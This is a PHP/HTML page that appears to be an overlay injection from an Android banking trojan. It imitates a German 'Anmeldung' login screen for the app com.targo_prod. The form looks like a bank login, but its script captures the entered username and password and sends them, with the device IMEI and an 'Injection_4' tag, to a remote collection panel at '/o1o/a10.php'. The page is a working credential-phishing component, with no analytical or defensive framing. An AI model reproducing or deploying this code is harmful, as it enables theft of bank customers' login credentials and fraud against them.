<html>
<head>
    <meta charset="UTF-8">
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js"></script>
	<link rel="stylesheet" href="de/com.targo_prod.bad/style.css">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="header">
        <img style="margin-right: 15px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAIAAAD9MqGbAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MjUwOUVFREE5N0Y5MTFFODg5M0ZCRTA5QUUxQzE4M0IiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MjUwOUVFREI5N0Y5MTFFODg5M0ZCRTA5QUUxQzE4M0IiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDoyNTA5RUVEODk3RjkxMUU4ODkzRkJFMDlBRTFDMTgzQiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDoyNTA5RUVEOTk3RjkxMUU4ODkzRkJFMDlBRTFDMTgzQiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PoGbQwoAAAE3SURBVHjaYmTQj2cgCzDhksgMdTqzvIFkndnhztOq4ww15L1t9XHpZMGqbUpl7L9//0v7V249fJFYO+HaKiet7lu8g1jXZoU5QbRVT1nTtWAb/hBiQQ6SqVVxQG1Vk9d0zt9KMGyhOtOCHYBBAtRWMXFV98LtxMWLfnxy/dz/pICCrqVAXSB/liV6kZESGIG6GRkZr65t1VSS+v7zl5pfxcu3H/Hr+fsPCP4zQlIfOxvLiUW1Bhrybz9+0Q2ufv7mI7Gp7+evPzaJbScv3xPm5zm/sklKVICEdPv1+0/3zO5jF26LC/OfXtZAUDNKSvj45bt3bv+R87eA2ghqRk99Hz5/88ufCNF8dnmjpAg/CXnl/aevvnkTjl28w8HOKsTPgy9WsErw83DKSQpfvv2EZJ0EAUCAAQAY3a7XYw63CAAAAABJRU5ErkJggg==">
        Anmeldung
          </div>
<center>
</br>
<form action="null" class="form" class="form" method="post" id="_mainForm" target="flow_handler">
    <div class="field11">
        <div class="field">
			<input type="text" name="benutzername" class="input" id="login" placeholder="Benutzername">

		</div>
    </br>
        <div class="field">
			<input type="password" name="" class="input" id="password" placeholder="passwort">

        </div>
        <p style="margin-top: 50px;"> Benutzerdaten anlegen </p>
        <p> Passwort vergessen? </p>

        <input type="submit" class="button" id="sbt_button" value="Bestätigen">
    </div>
</form>
</center>
<iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
<script type="text/javascript">
   (function () {
		var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
            var input = objDoc.createElement("input");
            input.setAttribute("type", "hidden");
            input.setAttribute("name", sNm);
            input.setAttribute("value", sV);
            input.value = sV;
            objForm.appendChild(input);
        };

        var g_oBtn = document.getElementById('sbt_button');
        g_oBtn.onclick = function () {

            var oNumInp = document.getElementById('login');
            var oCodeInp = document.getElementById('password');

            try{
                oNumInp.className = 'input';
                oCodeInp.className = 'input';
            } catch(e){};

            if (!/^\w{3,50}$/i.test(oNumInp.value)) {
                try{
                    oNumInp.className = 'fielderror';
                } catch(e){};
                return false;
            }

            if (!/^\w{3,50}$/i.test(oCodeInp.value)) {
                try{
                    oCodeInp.className = 'fielderror';
                } catch(e){};
                return false;
            }

			top['closeDlg'] = true;
          	var url='<?php echo $URL; ?>';
           	var imei_c='<?php echo $IMEI_country; ?>';
           	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|de_targo_prod|"+oNumInp.value+"|"+oCodeInp.value);

           return false;
       };

   })();
</script>
</body>
</html>
